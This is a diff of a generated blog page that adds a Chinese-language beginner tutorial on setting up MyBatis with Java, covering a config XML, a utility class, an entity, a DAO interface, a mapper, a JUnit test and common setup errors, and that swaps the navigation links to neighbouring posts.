class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?useSSL=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=UTF-8&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>编写mybatis工具类</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//工厂模式</span></span><br><span class="line"><span class="comment">// sqlSessionFactory --&gt;sqlSession</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MybatisUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//使用mybatis，第一步获取sqlSessionFactory对象</span></span><br><span class="line">            String resource = <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">            InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//既然有了 SqlSessionFactory，顾名思义，我们可以从中获得 SqlSession 的实例</span></span><br><span class="line">    <span class="comment">// SqlSession 提供了在数据库执行 SQL 命令所需的所有方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title">getSqlSession</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-编写代码"><a href="#3-编写代码" class="headerlink" title="3.编写代码"></a>3.编写代码</h3><ul>
+<li>实体类</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> uid;</span><br><span class="line">    <span class="keyword">private</span> String uname;</span><br><span class="line">    <span class="keyword">private</span> String upassword;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> uid, String uname, String upassword)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uid = uid;</span><br><span class="line">        <span class="keyword">this</span>.uname = uname;</span><br><span class="line">        <span class="keyword">this</span>.upassword = upassword;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getUid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUid</span><span class="params">(<span class="keyword">int</span> uid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uid = uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> uname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUname</span><span class="params">(String uname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uname = uname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUpassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> upassword;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUpassword</span><span class="params">(String upassword)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.upassword = upassword;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>dao接口</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">getUserList</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接口实现类</li>
+</ul>
+<p>由原来的UserDaoImpl转变为一个Mapper.xml配置文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--namespace==绑定一个对应的Dao/Mapper接口--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.nuc.dao.UserDao&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.nuc.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    select * from mybatis.user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//第一步：获得SqlSession对象</span></span><br><span class="line">        SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行sql</span></span><br><span class="line">        <span class="comment">//方式一：getMapper</span></span><br><span class="line">        UserDao userDao = sqlSession.getMapper(UserDao.class);</span><br><span class="line">        List&lt;User&gt; userList = userDao.getUserList();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：(不推荐使用)</span></span><br><span class="line"><span class="comment">//        List&lt;User&gt; userList1 = sqlSession.selectList(&quot;com.nuc.dao.UserDao.getUserList&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (User user : userList) &#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭SqlSession</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ol>
+<li>缺少配置文件<code>MapperRegistry</code></li>
+</ol>
+<p><code>org.apache.ibatis.binding.BindingException: Type interface com.nuc.dao.UserDao is not known to the MapperRegistry.</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    每一个Mapper.xml都要在mybatis核心配置中注册--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/nuc/dao/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Mapper.xml位置问题</li>
+</ol>
+<p><img src="https://i.loli.net/2021/11/26/TgmAL61Dhy97pBa.png" alt="image-20211126145303021"></p>
+<p>从dao里面移动到resources中</p>
 
                 
             </div>
@@ -559,7 +546,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://King10280.github.io/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/">https://King10280.github.io/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</a>
+                    <a href="https://King10280.github.io/2021/11/23/mybatis/">https://King10280.github.io/2021/11/23/mybatis/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -597,8 +584,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/ctf-sql/">
-                                    <span class="chip bg-color">ctf-sql</span>
+                                <a href="/tags/mybatis/">
+                                    <span class="chip bg-color">mybatis</span>
                                 </a>
                             
                         </div>
@@ -644,17 +631,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/06/28/redis-4-unacc/">
+                <a href="/2021/11/23/mybatis/">
                     <div class="card-image">
                         
+                        <img src="/images/mybatis-logo.png" class="responsive-img" alt="mybatis">
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="redis 4-unacc">
-                        
-                        <span class="card-title">redis 4-unacc</span>
+                        <span class="card-title">mybatis</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -664,26 +651,23 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-23
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/vulhub/" class="post-category">
-                                    vulhub
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            l0odrd
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/redis/">
-                        <span class="chip bg-color">redis</span>
+                    <a href="/tags/mybatis/">
+                        <span class="chip bg-color">mybatis</span>
                     </a>
                     
                 </div>
@@ -697,13 +681,12 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/">
+                <a href="/2021/11/23/spring/">
                     <div class="card-image">
                         
+                        <img src="/images/spring.jpg" class="responsive-img" alt="spring">
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="反弹shell学习">
-                        
-                        <span class="card-title">反弹shell学习</span>
+                        <span class="card-title">spring</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -714,7 +697,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-23
                             </span>
                         <span class="publish-author">
                             
@@ -723,6 +706,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/spring/">
+                        <span class="chip bg-color">spring</span>
+                    </a>
+                    
                 </div>
                 
             </div>
